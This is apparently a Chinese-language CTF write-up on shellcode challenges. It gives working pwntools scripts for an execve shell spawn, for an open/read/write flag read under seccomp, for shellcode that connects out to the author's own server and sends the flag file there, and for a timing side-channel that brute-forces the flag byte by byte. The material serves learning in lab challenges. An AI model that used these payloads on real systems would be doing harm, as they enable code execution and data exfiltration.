syscall参考：  
https://w3challs.com/syscalls/  

1.execve:  
思路：编写汇编语言，调用execve syscall 获取shell  

from pwn import *
r = remote("pwn.sixstars.team",22017)
shellcode_r="""
     call here
     .ascii "/bin/sh"
     .byte 0
here:
     pop rdi
     xor rsi,rsi
     xor rdx,rdx
     mov rax,0x3b
     syscall
"""
shellcode = """
     mov dl,0xff
     xor rdi,rdi
     xor rax,rax
     syscall
"""
#64 exeave 3register pass arguments rdi rsi rdx  rax 0x3b syscall
#three """means these are all strings
#.byte0 means end buling
shellcode_1=asm(shellcode,arch="amd64")
shellcode_r=asm(shellcode_r,arch="amd64")
r.send(shellcode_1)
r.sendline('a'*len(shellcode_1)+shellcode_r)
#覆盖掉刚执行完任务的代码
r.interactive()
#事实上可以不需要两个shellcodepayload，直接调用execve就行叭

#x86_64使用syscall
#x86使用int 0x80


2.orw  
思路：题目只允许使用 open read write exit 系统调用。
需要编写shellcode实现 a.打开文件 open b.读取文件内容 read c.将读到的内容输出 write  


#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch = "i386"
pwn_file="./chall"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23601)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode = """
    call here
    .ascii "flag"
    .byte 0
here:
     pop ebx
     xor ecx,ecx
     mov edx,0x02
     mov eax,0x05
     int 0x80
     mov edx,0x100      #read的长度，随便设的
     mov ebx,0x03       #理论上服务器上新open的flag文件的文件描述符应是0x03 
     mov ecx,0x601000   #vmmap查看程序得到的一段可读可写的内存空间，是read内容的存放地址
     mov eax,0x03
     int 0x80
     mov ecx,0x601000   #write从内存地址读内容写出来
     mov ebx,0x01       #是write函数写到哪里的文件描述符，这里为屏幕
     mov edx,0x100      #write的长度，随便设的
     mov eax,0x04
     int 0x80
"""

sh = asm(shellcode)

#debug()
r.sendlineafter("Give me your shellcode :", sh)
r.interactive()


3.socket  
思路：将输入流、输出流都关闭。并且禁用了execve系统调用  
编写shellcode实现  
a.和远程的一个端口建立一个tcp连接(需要哪些系统调用？可以用c语言实现建立tcp连接的程序，然后单步调试查看使用了哪些syscall）  
b.读取文件内容 read   
c.将读到的内容输出到tcp的文件描述符上  
源程序： 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+10h] [rbp-10h]

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setbuf(stderr, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  printf("Give me your shellcode :", 4096LL, argv);
  read(0, buf, 0x100uLL);
  close(0);
  close(1);
  close(2);
  if ( (unsigned int)install_filter(2LL, buf) )
    exit(1);
  JUMPOUT(__CS__, buf);
}
第113-115行可以看出关闭了向屏幕输出的流等  
简单来说就是脚本给服务器提供一段shellcode之后服务器会自动“断开”和脚本的联系  
解决方法是用shellcode让服务器自己open+read flag文件，并且和我们自己的一台服务器进行tcp连接，让服务器把内容  
write到我们的服务器上，然后我们去自己服务器的那个端口得到flag内容  

*关于如何用shellcode建立tcp连接，这里只需要写一个连接的c函数，编译后objdump得到汇编代码，看main函数中调用了哪些  
系统函数和他们的参数，然后在shellcode中也按照相同的参数调用系统函数  

建立tcp连接的c函数：  
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#define SERVER_PORT 6666
/*
连接到服务器后，会不停循环，等待输入，
输入quit后，断开与服务器的连接
*/
int main()
{
//客户端只需要一个套接字文件描述符，用于和服务器通信
int clientSocket;
//描述服务器的socket
struct sockaddr_in serverAddr;
char sendbuf[200];
char recvbuf[200];
int iDataNum;
if((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
{
perror("socket");
return 1;
}
serverAddr.sin_family = AF_INET;
serverAddr.sin_port = htons(SERVER_PORT);
//指定服务器端的ip，本地测试：127.0.0.1
//inet_addr()函数，将点分十进制IP转换成网络字节序IP
serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
return 0;
}


反汇编后可以看出只调用了socket和connect系统函数  
脚本：  
from pwn import *
context.log_level="debug"
context.arch = "amd64"
pwn_file="./chall3"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23603)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

shellcode = """
    mov rax,0x29
    mov rdi,0x02
    mov rsi,0x01
    mov rdx,0x00
    syscall
    mov r9,rax
    mov rdi,rax
    mov rax,0x2a
    mov rbx,0x0
    mov rdx,0x10
    mov rsi,0x3e8d840a39300002  #运行c程序gdb得到的调用syscall前的参数  
    push 0                      #保证不会有别的数混进来  
    push rsi
    mov rsi,rsp                #参数rsi是建立连接的一个地址（而不是值）  
    syscall
    call here
    .ascii "flag"
    .byte 0
here:
     pop rdi
     xor rsi,rsi
     mov rdx,0x05
     mov rax,0x02
     syscall
     mov rdx,0x100
     mov rdi,rax         #read的文件描述符是上一个open调用返回后rax里的值  
     mov rsi,0x601000
     mov rax,0x0
     syscall
     mov rsi,0x601000
     mov rax,0x01
     mov rdi,r9          #建立tcp连接时返回的我们的服务器的文件描述符
     mov rdx,0x100 
     syscall
"""

sh = asm(shellcode)
debug()
r.sendlineafter("Give me your shellcode :", sh)
r.interactive()



4.slide-attack侧信道攻击  
插件seccomp-tools可以得出程序可以用哪些syscall又禁用了哪些syscall  
下载地址：https://github.com/david942j/seccomp-tools  

parallels@parallels-vm:~$ seccomp-tools dump ./Documents/slideattack 
Give me your shellcode :1
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009
 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008
 0006: 0x15 0x01 0x00 0x00000003  if (A == close) goto 0008
 0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL


思路：一个个匹配服务器端的flag，如果配上了就陷入一个死循环，没配上就结束，然后一个个试
from pwn import *
context.log_level="debug"
context.arch = "amd64"
pwn_file="./chall"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
letters = [ '*', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{',  '}']
#if len(sys.argv)==1:
    #r=process(pwn_file)
    #pid=r.pid
#else:
   # r=remote("pwn.sixstars.team", 23604)
    #pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()
strq = ""
for i in range(38):
 for e in letters:
  #r=process(pwn_file)
  r=remote("pwn.sixstars.team", 23604)
  #print r.pid#
  
  shellcode = """
      mov r8b,emmm
      call here
      .ascii "flag"
      .byte 0
  here:
       pop rdi
       xor rsi,rsi
       mov rdx,0x05
       mov rax,0x02
       syscall
       mov rdx,0x100
       mov rdi,rax
       mov rsi,0x601000
       mov rax,0x0
       syscall
       mov rbx,0x601000
       mov al, byte ptr[ebx+1*iii]
       xor r8b,al
       jz loop
       jmp ppp
  loop:
       jmp loop
  ppp:
       mov rax,0x0
  """
  shellcode=shellcode.replace("emmm",str(ord(e)))
  shellcode=shellcode.replace("iii",str(i))
  sh = asm(shellcode)
  #pause()
  r.sendlineafter("Give me your shellcode :", sh)
  #r.interactive()
  try:
     r.recvline(timeout=2)
     print "???????????????????????????????????????"
     print e
     strq = strq+e
     r.close()
     continue
  except Exception as ee:
     #print "======================================"
     print e
     r.close()
     continue
  

print strq



#debug()
#r.sendlineafter("Give me your shellcode :", sh)
#r.interactive
